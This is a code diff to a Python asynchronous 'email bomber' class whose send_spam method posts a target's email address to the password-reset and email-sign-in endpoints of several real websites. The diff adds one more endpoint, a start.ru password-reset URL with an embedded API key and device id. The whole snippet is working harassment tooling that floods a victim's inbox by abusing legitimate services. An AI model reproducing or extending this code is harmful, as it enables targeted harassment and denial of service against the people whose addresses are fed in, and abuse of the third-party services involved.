@@ -15,4 +15,5 @@ class AsyncBomber():
 	async def send_spam(self,email):
 		await self.session.post('https://api.newmanga.org/v2/forgot_password',json={"credentials":email},headers=self.headers)
 		await self.session.post("https://anitype.site/app2/auth/email/send",json={"redirect":"https://anitype.fun/auth/email","email":email},headers=self.headers)
+		await self.session.post("https://api.start.ru/auth/password/reset?apikey=a20b12b279f744f2b3c7b5c5400c4eb5",json={"device_id":"359847a8-7395-40bf-820b-bbbc21294f24","device_type":"web","client_platform":"start","email":email},headers=self.headers)
 		await self.session.post("https://internal.intellect.co/api/user/auth/password/forgot/request",json= {"email": email},headers={"content-type": "application/json","accept": "application/json","user-agent": "okhttp/3.12.1"})
